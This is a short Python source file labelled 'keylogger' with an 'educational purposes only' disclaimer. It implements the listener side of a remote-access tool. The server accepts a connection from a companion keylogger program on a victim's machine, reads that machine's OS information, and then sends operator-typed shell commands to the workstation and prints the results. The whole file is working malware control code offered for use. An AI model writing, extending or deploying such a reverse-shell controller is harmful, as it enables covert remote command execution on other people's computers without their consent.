########### keylogger  ########
########### Author: Nadav Yarkon #############
##This tool is for educational purposes only. don't use them for illegal activities!##

#Author: Nadav Yarkon
#Email: Nadavy2469 @ gmail.com
#https: https://github.com/Nadav-Yarkon


import argparse
import socket

def GetOsInfo(conn):
    print()
    i=0
    while (i<6):
        val = conn.recv(1024).decode('UTF-8')
        print (val)
        i=i+1
    print()

def RunServerToShell(Host , Port):
        print("The server is listening.")
        sock_info = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock_info.bind((Host, Port))
        sock_info.listen(1)
        conn, addr = sock_info.accept()
        print('Got connection from', addr )
        GetOsInfo(conn)

        while True:
            s=input("Enter the command: ")
            conn.send(s.encode())
            data = conn.recv(1024)
            data = data.decode('UTF-8')
            print(data)


parser = argparse.ArgumentParser(description='The program needs to get  IP and Port for listening \n' 
                                            'Enter the IP and deffrent Port in Keylogger program  \n'
                                             'This program get you to run command in workstation of the user. \n')
parser.add_argument("-i", "-ip" , metavar='' , required=True , help= "IP that the server was listening" , type=str)
parser.add_argument("-p", "-port" , metavar='' , required=True , help="Port that the server was listening" ,type=int)
parser.parse_args()
args = parser.parse_args()
RunServerToShell(args.i , args.p)




